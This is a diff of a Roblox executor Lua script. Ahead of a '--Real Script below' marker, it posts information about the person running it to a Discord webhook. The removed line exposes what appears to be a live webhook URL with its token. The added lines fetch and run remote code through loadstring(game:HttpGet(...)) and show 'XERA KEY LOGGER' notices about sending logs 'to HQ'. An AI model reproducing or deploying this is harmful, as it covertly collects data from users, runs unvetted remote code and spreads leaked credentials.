@@ -4,7 +4,7 @@ local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
 local HTTP = syn and syn.request or http_request or request or HttpPost
 
-local WebhookURL = "https://discord.com/api/webhooks/1250835829262254140/9_vWqX4WUetBrrNgflt1JQINQ5Hn1d-3n0FgXeg29HtKcCiJOnjNjLEkdz0VJdmcaFv-"
+local WebhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
 
 local Headers = {
     ['Content-Type'] = 'application/json',
@@ -21,8 +21,8 @@ local randomColor = math.random(0x000000, 0xFFFFFF)
 local currentTime = os.date("!*t") -- Get UTC time
 local timestamp = string.format("%s %02d:%02d:%02d UTC", os.date("%B"), currentTime.hour, currentTime.min, currentTime.sec)
 
--- Get the ID of the Roblox game
-local gameId = game.GameId
+-- Get the name of the Roblox game
+local gameName = game.Name
 
 local data = {
     ["embeds"] = {
@@ -43,8 +43,8 @@ local data = {
                     ["inline"] = true,
                 },
                 {
-                    ["name"] = "Game ID:",
-                    ["value"] = "Roblox Game ID: " .. gameId,
+                    ["name"] = "Local Game Name:",
+                    ["value"] = gameName,
                     ["inline"] = false,
                 },
                 {
@@ -72,10 +72,28 @@ if not success then
     warn("Failed to send webhook:", response)
 end
 
-  
-  
-  
 --Real Script below
+
+local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
+local Notify = AkaliNotif.Notify;
+
+wait(1);
+
+Notify({
+Description = "SENDING THE LOGS AND INFORMATION TO HQ";
+Title = "XERA KEY LOGGER";
+Duration = 5;
+});
+
+wait(5);
+
+Notify({
+Description = "information sent wait 5 seconds completeing Main tasks";
+Title = "XERA KEY LOGGER";
+Duration = 5;
+});
+
+wait(5);
 
 local suskey = "KEY_ZdDccaK23Ikom1NaghaLokiW"
 
